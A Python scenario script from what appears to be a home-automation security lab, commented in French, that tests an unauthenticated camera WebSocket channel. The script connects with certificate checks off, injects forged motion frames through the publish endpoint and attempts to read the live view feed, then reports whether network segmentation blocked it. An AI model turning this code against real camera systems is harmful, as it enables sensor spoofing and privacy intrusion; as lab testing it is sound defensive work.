"""TI-05 — Attaque du canal caméra.

Risque visé : R-05 (caméra / vie privée). Le pont caméra (WebSocket /ws/camera/publish et /view sur
le hub HTTPS) n'est PAS authentifié : un attaquant qui atteint le port 8000 peut :
  a) injecter de fausses images / un faux mouvement (publish) ;
  b) recevoir le flux en direct (view) — atteinte à la vie privée.

Ce scénario met en évidence une LIMITE connue : le canal caméra ne porte pas d'authentification
applicative ; sa protection repose sur la segmentation réseau (le pare-feu GNS3 n'autorise que les
objets à joindre le hub sur 8000, et isole l'attaquant). Le scénario vérifie ce que l'attaquant
peut faire s'il atteint le port — et, par contraste, que le pare-feu doit le lui interdire.

Dépendance : websocket-client (installé par install.sh). Absent -> le scénario le signale.
"""
import json
import os
import sys
import time
from datetime import datetime, timezone

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "lib"))
from common import load_cfg  # noqa: E402


def run(cfg: dict) -> dict:
    since = datetime.now(timezone.utc).isoformat()
    try:
        import ssl
        import websocket  # websocket-client
    except ImportError:
        return {"ti": "TI-05", "nom": "Attaque de la caméra", "execute": False, "bloque": None,
                "note": "websocket-client manquant (lancer attack-lab/install.sh)", "evidence": None}

    base = cfg["api_base"].replace("https://", "wss://").replace("http://", "ws://")
    sslopt = {"cert_reqs": ssl.CERT_NONE}
    reached, injected, viewed = False, False, False
    try:
        pub = websocket.create_connection(base + "/ws/camera/publish", timeout=5, sslopt=sslopt)
        reached = True
        # Faux mouvement : deux vignettes très différentes pour simuler une présence.
        for g in ([0] * 768, [255] * 768, [0] * 768):
            pub.send(json.dumps({"ts": datetime.now(timezone.utc).isoformat(),
                                 "jpeg": "data:image/jpeg;base64,FORGE", "gray": g, "gw": 32, "gh": 24}))
            time.sleep(0.2)
        injected = True
        pub.close()
    except Exception as err:
        return {"ti": "TI-05", "nom": "Attaque de la caméra", "execute": reached,
                "bloque": not reached, "note": f"canal caméra injoignable : {err} "
                "(bon signe : le pare-feu/segmentation bloque l'accès au port 8000)", "evidence": None}
    try:
        view = websocket.create_connection(base + "/ws/camera/view", timeout=5, sslopt=sslopt)
        view.settimeout(3)
        _ = view.recv()
        viewed = True
        view.close()
    except Exception:
        pass
    note = (f"canal caméra ATTEINT (port 8000 accessible) ; faux mouvement injecté : {injected} ; "
            f"flux reçu (vie privée) : {viewed}. Protection = segmentation réseau (pare-feu GNS3).")
    return {"ti": "TI-05", "nom": "Attaque de la caméra", "execute": True, "bloque": False,
            "note": note, "evidence": {"since": since, "device_id": "cam-01", "sensor": "motion",
                                       "attendu": "mouvement forgé"}}


if __name__ == "__main__":
    print(run(load_cfg()))
